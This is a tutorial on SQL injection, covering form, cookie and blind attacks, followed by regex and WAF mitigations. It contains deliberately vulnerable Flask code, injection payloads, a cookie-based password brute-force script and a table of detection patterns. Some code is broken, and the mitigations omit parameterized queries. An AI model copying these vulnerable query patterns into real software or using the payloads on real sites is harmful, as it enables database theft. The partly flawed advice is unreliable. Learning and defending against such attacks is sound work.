# SQL Injection Attack

## SQL Injection

SQL injection is one of the top 10 most dangerous attacks on **OWASP**. It has been described to be the most serious threat of all time. Web application that are vulnerable to **SQLIA** may allow an attacker to gain full access to the **server's database**, it allows attacker to get sensitive data and disturb the web-application service in some cases too.

This security problem will result into not only stealing data, but possible identity thieft; losing credibelity and also corrupt the system that holds this **vulnerability**

![sqlia](pictures/sqlia/sql-injection.svg)

**Figure 1** : overview of SQl Injection 


## Injection Mechanism

Malicious SQL statements can be injected in many diffrent input forms such as **HTML forms**, **cookies** and so on..

### Injection through user input

The attacker injects the malicious sql request on an **html form** by providing a suitable user input. Most SQLIA comes from form submission that are sent to web server through a ``GET`` or ``POST`` request. Web applications will then access this inputs and forward an SQL statement to the database.

**Example**

Let's take the following statement that check if an email exists in the database

```sql
SELECT * from "EMAILS" where  email_name = "{}"
```

the user will submit the email on the form with the form ``id = email``

the backend script will be as following

```python
from flask import Flask, request, render_template_string
import sqlite3

app = Flask(__name__)

conn = sqlite3.connect('emails.db')

@app.route('/submit', methods=['POST'])
def submit():
    email = request.form['email']
    conn = sqlite3.connect('emails.db')
    cursor = conn.cursor()
    cursor.execute('SELECT * from "EMAILS" where  email_name = "{}"'.format(email))
    conn.commit()
    conn.close()
    return "".join(list(cursor.fetchall()))

```

an attacker can inject a milicious statement to fetch info in the database further such as ``" OR "1"="1`` and this will return all **emails** to the attacker.


### Injection through cookies

first of all, what are **cookies**?

cookies are small piece of data that a website sends the a user's browser; This data is stored on user's browser and get sent to website with each new request while browsering.

A valid cookie typically consists of a name-value pair along with optional attributes such as domain, path, expiration date, and secure flag. Here’s an example of a valid HTTP cookie:

```https
Set-Cookie: sessionId=abc123; Domain=example.com; Path=/; Expires=Wed, 12 Jul 2024 10:00:00 GMT; Secure; HttpOnly
```

Attackers can exploit poor implementation of cookies validation to start an SQL injection attack. this occur through injecting a malicious sql statement with the cookies.

Here is an example of a poor implemented cookies validation script in python : 

```python
from flask import Flask, request, make_response
import sqlite3

app = Flask(__name__)

# Function to connect to the SQLite3 database
def get_db_connection():
    conn = sqlite3.connect('users.db')
    conn.row_factory = sqlite3.Row
    return conn

# Route to validate cookies
@app.route('/validate')
def validate_cookie():
    user_cookie = request.cookies.get('session_id')
    if not user_cookie:
        return "No cookie provided!", 400

    conn = get_db_connection()
    cursor = conn.cursor()
    
    # Intentionally vulnerable SQL query
    query = f"SELECT * FROM users WHERE session_id = '{user_cookie}'"
    cursor.execute(query)
    user = cursor.fetchone()
    
    conn.close()

    if user:
        return f"Welcome back, {user['username']}!"
    else:
        return "Invalid session ID.", 403

if __name__ == '__main__':
    app.run(debug=True)
```

This script is vulnerable to **SQLIA** attacks. You can simply inject the following code in the cookies to return confidential data from the database.

A genuine cookies will be as following : 

``session_id = 2132``

We can inject the following code to get more data about the database.

```sql
session_id = 2132';SELECT name FROM sqlite_master WHERE type='table
```

The next request will be sent to the database 

```sql
SELECT * FROM users WHERE session_id = 'session_id = 2132';SELECT name FROM sqlite_master WHERE type='table'
```

which means a successful exploitation


## Blind injection

Blind SQL Injection occurs when a web application is vulnerable to SQLIA but the HTTP response doesn't include any relevent data from the database nor details of any potential erros. In the examples we provided, both of the servers return raw data from the database. but what if the server doesn't really do that? maybe it returns a ``true`` or ``false`` statements.

In this section we will learn how to successfully execute a Blind SQL Injection and to extract sensitive data via verbose SQL error.

### Exploiting Blind SQL Injection by Inducing Conditional Responses

consider our last example where we execute an attack through cookies. the following cookie is a legit one 

```session_id = 2132```

When a request contain a ``session_id`` it will proceed as following on the provided **flask** code.

```SQL
SELECT * FROM users WHERE session_id = '{user_cookie}'
```

This query in some cases will not return information to the user through an HTTP response but we can observe some changes happen for example, if it is a valid cookie that is confirmed to be in the database. the server will return "Welcome Home" or something similar.

This response is enough for us to be able to exploit the blind sql injection. You can retrieve informations by triggering different responses 

for example, we can inject two codes and see the behavior of the website

```sql
session_id = 2132' AND '1' = '1
session_id = 2132' AND '1' = '2
```

In our application, the first query has returned "Welcome home" but the second when redirected our application for example to signup. This happen because first query returned True on ``1==1`` but the second one returned false on ``1==2``. This indicate that our system is vulnerable to **SQLIA**. and this way we find that the server is vulnerable to blind sql injection.

This way we can extract data from any single condition and extract data one-by-one.

Let's take for example if there is a table called **Users**, This table include the username and password of each user, and you want to bruteforce the password of a user called **Admin**. 

You can brute force the admin password from observing changes happening to the webpage.

the following script brute force **Admin** on the ``session_id`` cookies parameter

```python
import requests

malicious_query = "2132' AND SELECT * FROM Users Where user = 'Admin' and 'password' = 'PASS"
url = "https://vulnerablewebsite/validate"
passwords = list(open("dictionary.txt").read().splitlines())
# test all passwords 
for password in passwords :
    cookies = {
        "session_id" : malicious_query.replace("PASS",password)
    }
    response = requests.post(url,cookies = cookies).text
    if "Welcome Home" in response.text:
        print("Succesfully found password",password)
        break
```

## SQL Injection Attack Mitigation Techniques

Protection against sql injection attack must be crucial on all servers, and to do that, there is few techniques to detect when someone attempting to execute an SQLIA.

### User input escaping

This technique implement a layer of validation on the web application front-end, where the developer doesn't allow submittion from web-application if the user input ain't matched with a safe regex pattern. for example, a developer can use this regex ``^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$`` with email to accept only valide email addresses. It's effective as a new security layer on **Injection through user input**; It doesn't help a lot with the other type and can't really be of any help if the attacker sends instead an HTTP request to the server's **API** with a malicious code. But, I really recommend this implementation because in some cases, you don't know where or how your webserver can act strangely with this kind of validations.

### Implement sanitization technique


This technique implement a layer of security and correction on the web application backend, where in case an attacker sends a malicious SQL Injection through cookies or submittion or any method, the server will detect this attack with regex (by matching patterns with known attack signatures) and respond appropriately based on the situation.

The next table include different type of SQLIA and correspending detection regex for each

| Attack Type                        | Regex Pattern                              |
|------------------------------------|--------------------------------------------|
| Union-Based Injection              | `(?i)(union\s+select)`                     |
| Error-Based Injection              | `(?i)(or\s+1=1)`                           |
| Boolean-Based Injection            | `(?i)(and\s+1=1)`                          |
| Time-Based Injection               | `(?i)(sleep\(\d+\))`                       |
| Blind SQL Injection                | ``(?i)((or\|and)\s+.*?=.*?--.*?$)``        |
| Piggy-Backed Queries               | `(?i);--`                                  |
| Tautology                          | `(?i)(\sOR\s[^\s]+\s*=\s*[^\s]+)`          |
| End-of-Line Comment                | `(?i)--\s*$`                               |
| Illegal/Logically Incorrect Queries| `(?i)(' or 1=1--)`                         |
| Stacked Queries                    | `(?i);[\s]*$`                              |

**table 1** : SQL Injection Attack Types and Corresponding Regex Patterns


### Deploy a Web Application Framework

A Web Application Firewall (WAF) monitors and filters incoming HTTP traffic, detecting and blocking SQL injection attempts. It uses configurable rules to identify patterns associated with SQL injection, providing an additional layer of defense. <sup>[1](https://www.indusface.com/blog/how-to-stop-sql-injection/)<sup>

**Example WAF Rule**

```sql
SecRule ARGS “(select|union|insert|delete|drop)” “deny,log”
```
This rule acts as a security filter by scanning incoming data for specific keywords often linked to SQL injection. If such keywords are detected, the request is denied, and the occurrence is logged, enhancing protection against potential attacks.

**Benefits of WAF**

Many organizations face challenges such as outdated code, limited testing resources, lack of application security awareness, and the rapid pace of application updates. Minor code changes can introduce injection vulnerabilities if not thoroughly reviewed.

When immediate code fixes are not feasible, WAFs offer a solution through virtual patching. This approach secures applications against known vulnerabilities quickly, providing a buffer period to implement proper code fixes or updates.


## Conclusion
SQL Injection Attacks (**SQLIA**) pose significant threats to web applications, potentially leading to data breaches, identity theft, and system corruption. Understanding the mechanisms of SQLIA and implementing robust mitigation techniques is crucial for protecting sensitive data and maintaining the integrity of web applications. 

By utilizing input validation, sanitization techniques, and Web Application Firewalls (WAFs), organizations can significantly reduce the risk of SQL injection attacks. These measures, combined with regular security reviews and updates, help create a comprehensive defense strategy. 

Staying informed about the latest security practices and continuously monitoring for vulnerabilities ensures that web applications remain resilient against evolving threats.